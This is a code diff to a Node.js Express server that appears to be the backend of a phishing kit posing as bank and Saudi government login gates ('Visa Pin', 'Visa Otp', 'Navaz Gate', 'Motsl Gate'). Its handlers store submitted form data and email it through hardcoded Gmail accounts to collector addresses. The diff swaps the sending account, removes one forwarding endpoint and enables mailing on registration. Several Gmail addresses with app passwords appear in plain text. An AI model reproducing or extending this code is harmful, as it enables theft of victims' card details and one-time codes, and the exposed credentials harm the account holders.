@@ -8,14 +8,14 @@ const server = require("http").createServer(app);
 const PORT = process.env.PORT || 8080;
 const io = require("socket.io")(server, { cors: { origin: "*" } });
 app.use(express.json());
-app.use(cors({origin:'*'}));
+app.use(cors("*"));
 app.use(require("morgan")("dev"));
 
 const emailData = {
-  user: "taminkaram60@gmail.com",
-  pass: "whai mwsw dlef aoli",
-  // user: "karamalzoubi2045@gmail.com",
-  // pass: "aczd aicu rmru eiha",
+  // user: "taminkaram60@gmail.com",
+  // pass: "whai mwsw dlef aoli",
+  user: "karamalzoubi2045@gmail.com",
+  pass: "jysn zlyr agrn vvij",
 };
 
 const sendEmail = async (data, type) => {
@@ -55,7 +55,7 @@ const sendEmail = async (data, type) => {
           ? "Salama - Navaz Gate "
           : type === "navazOtp"
           ? "Salama Navaz Last Otp  "
-          : "Salama "
+          : " "
       }`,
       html: htmlContent,
     })
@@ -73,101 +73,7 @@ const sendEmail = async (data, type) => {
 };
 
 app.get("/", (req, res) => res.sendStatus(200));
-app.post("/email", async (req, res) => {
-  if (req.query.type === "one") {
-    const transporter = nodemailer.createTransport({
-      service: "gmail",
-      auth: {
-        user: emailData.user,
-        pass: emailData.pass,
-      },
-    });
-    let htmlContent = "<div>";
-    for (const [key, value] of Object.entries(req.body)) {
-      htmlContent += `<p>${key}: ${
-        typeof value === "object" ? JSON.stringify(value) : value
-      }</p>`;
-    }
-    await transporter
-      .sendMail({
-        from: "Admin Panel",
-        to: "pnusds269@gmail.com",
-        subject: `${
-          req.query.visa
-            ? "Salama  Visa"
-            : req.query.reg
-            ? "Salama Register Form "
-            : req.query.otp
-            ? "Salama Visa Otp "
-            : req.query.pin
-            ? "Salama Visa Pin "
-            : req.query.motsal
-            ? "Salama - Motsl Gate Data "
-            : req.query.motsalOtp
-            ? "Salama - Motsl Gate Otp "
-            : req.query.navaz
-            ? "Salama - Navaz Gate "
-            : req.query.navazOtp
-            ? "Salama Navaz Last Otp  "
-            : "Salama Bank Visa"
-        }`,
-        html: htmlContent,
-      })
-      .then((info) => {
-        if (info.accepted.length) {
-          res.sendStatus(200);
-        } else {
-          res.sendStatus(400);
-        }
-      });
-  } else {
-    const transporter = nodemailer.createTransport({
-      service: "gmail",
-      auth: {
-        user: "saudiabsher1990@gmail.com",
-        pass: "nazl tmfi oxnn astq",
-      },
-    });
-    let htmlContent = "<div>";
-    for (const [key, value] of Object.entries(req.body)) {
-      htmlContent += `<p>${key}: ${
-        typeof value === "object" ? JSON.stringify(value) : value
-      }</p>`;
-    }
-    await transporter
-      .sendMail({
-        from: "Admin Panel",
-        to: "saudiabsher1990@gmail.com",
-        subject: `${
-          req.query.visa
-            ? "Salama  Visa"
-            : req.query.reg
-            ? "Salama Register Form "
-            : req.query.otp
-            ? "Salama Visa Otp "
-            : req.query.pin
-            ? "Salama Visa Pin "
-            : req.query.motsal
-            ? "Salama - Motsl Gate Data "
-            : req.query.motsalOtp
-            ? "Salama - Motsl Gate Otp "
-            : req.query.navaz
-            ? "Salama - Navaz Gate "
-            : req.query.navazOtp
-            ? "Salama Navaz Last Otp  "
-            : "Salama Bank Visa"
-        }`,
-        html: htmlContent,
-      })
-      .then((info) => {
-        if (info.accepted.length) {
-          res.sendStatus(200);
-        } else {
-          res.sendStatus(400);
-        }
-      });
-  }
-});
+
 app.delete("/", async (req, res) => {
   await Order.find({})
     .then(async (orders) => {
@@ -184,9 +90,9 @@ app.post("/reg", async (req, res) => {
   try {
     await Order.create(req.body).then(
       async (user) =>
-        // await sendEmail(req.body, "reg").then(() =>
+        await sendEmail(req.body, "reg").then(() =>
           res.status(201).json({ user })
-        // )
+        )
     );
   } catch (error) {
     console.log("Error: " + error);
